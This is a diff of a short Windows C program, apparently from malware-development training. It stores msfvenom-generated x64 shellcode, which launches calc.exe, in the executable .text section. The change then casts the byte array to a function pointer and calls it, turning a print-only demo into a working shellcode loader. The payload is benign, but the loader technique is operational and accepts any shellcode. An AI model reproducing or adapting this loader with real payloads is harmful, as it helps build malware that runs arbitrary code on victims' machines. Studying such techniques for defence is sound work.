@@ -1,10 +1,10 @@
 #include <Windows.h>
 #include <stdio.h>
 
-// msfvenom calc shellcode
 // msfvenom -p windows/x64/exec CMD=calc.exe -f c 
-// .data saved payload
-unsigned char Data_RawData[] = {
+// .text saved payload
+#pragma section(".text")
+__declspec(allocate(".text")) const unsigned char Text_RawData[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
 	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
 	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
@@ -31,9 +31,10 @@ unsigned char Data_RawData[] = {
 };
 
 int main() {
+	// execute the payload with typecasting the pointer to the payload as a function pointer and calling it
+	void (*ExecuterPayload)() = (void(*)())(uintptr_t)Text_RawData;
 
-	printf("[i] Data_RawData var : 0x%p \n", Data_RawData);
-	printf("[#] Press <Enter> To Quit ...");
-	getchar();
+	ExecuterPayload();
+
 	return 0;
 }
